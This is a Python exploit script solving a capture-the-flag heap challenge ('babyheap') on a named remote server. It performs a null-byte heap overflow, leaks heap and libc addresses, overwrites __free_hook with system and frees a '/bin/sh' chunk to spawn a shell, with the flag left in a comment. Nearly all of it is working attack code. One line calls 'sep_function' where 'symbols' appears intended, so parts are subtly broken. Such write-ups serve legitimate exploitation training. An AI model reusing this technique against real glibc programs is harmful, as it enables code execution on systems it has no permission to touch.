#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './babyheap'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'chall.0ops.sjtu.edu.cn', 'port':2004})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    bh = BabyHeap(conn)

    pad = []

    X   = bh.alloc(0x468)
    p   = bh.alloc(0x18)
    pad.append(bh.alloc(1))
    Y   = bh.alloc(0x28)
    fd  = bh.alloc(0x18)
    pad.append(bh.alloc(1))
    bk2 = bh.alloc(0x18)
    pad.append(bh.alloc(1))
    Z   = bh.alloc(0x28)
    bk  = bh.alloc(0x18)

    for _ in range(4):
        pad.append(bh.alloc(0x18))
    for i in pad:
        bh.delete(i)

    for _ in range(7):
        pad.append(bh.alloc(0x28))
    for i in pad:
        bh.delete(i)

    huge = bh.alloc(0x418)

    bh.delete(bk2)
    bh.delete(bk)
    bh.delete(p)
    bh.delete(fd)

    bh.delete(huge)         # malloc_consolidate
    huge = bh.alloc(0x418)  # unsorted -> small

    bh.delete(X)
    bh.delete(Y)
    bh.delete(Z)

    bh.delete(huge)         # malloc_consolidate

    p  = bh.alloc(0x488)
    fd = bh.alloc(0x48)
    bk = bh.alloc(0x48)

    bh.update(p, 0x470-1, b'P'*0x468+p64(0x351)[:-1])
    bh.update(fd, 0x38, 'F'*0x38)
    bh.update(bk, 0x30, 'B'*0x30)

    a = bh.alloc(0x38)
    b = bh.alloc(0x4f8)
    bh.alloc(0x38)
    bh.update(a, 0x38, b'0'*0x30+p64(0x350))
    bh.delete(b)

    addr_heap_start = u(bh.view(fd)[0x38:]) - 0x590
    info('addr_heap_start   = 0x{:08x}'.format(addr_heap_start))

    bh.alloc(0x38)

    addr_libc_mainarena = u(bh.view(fd)) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_free_hook = libc.symbols['__free_hook']

    bh.alloc(0x158)

    c = bh.alloc(0x38)
    bh.update(c, 0x8, p64(addr_libc_free_hook))

    sh = bh.alloc(0x18)
    fh = bh.alloc(0x18)
    bh.update(sh, 0x8, '/bin/sh\x00')
    bh.update(fh, 0x8, p64(addr_libc_system))
    bh.delete(sh)

class BabyHeap:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def alloc(self, size):
        self.sendlineafter('Command: ', '1')
        self.sendlineafter('Size: ', str(size))
        
        res = re.match(r'Chunk (\d+) Allocated', self.recvuntil('\n', drop=True).decode())
        return int(res.group(1))

    def update(self, idx, size, content):
        self.sendlineafter('Command: ', '2')
        self.sendlineafter('Index: ', str(idx))
        self.sendlineafter('Size: ', str(size))
        self.sendafter('Content: ', content)

    def delete(self, idx):
        self.sendlineafter('Command: ', '3')
        self.sendlineafter('Index: ', str(idx))

    def view(self, idx):
        self.sendlineafter('Command: ', '4')
        self.sendlineafter('Index: ', str(idx))

        self.recvuntil(']: ')
        return self.recvuntil('\n1. ', drop=True)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # flag{NuLL_byte_1s_alw4ys_y0ur_g00d_fr13nd}

if __name__=='__main__':
    main()

#==========
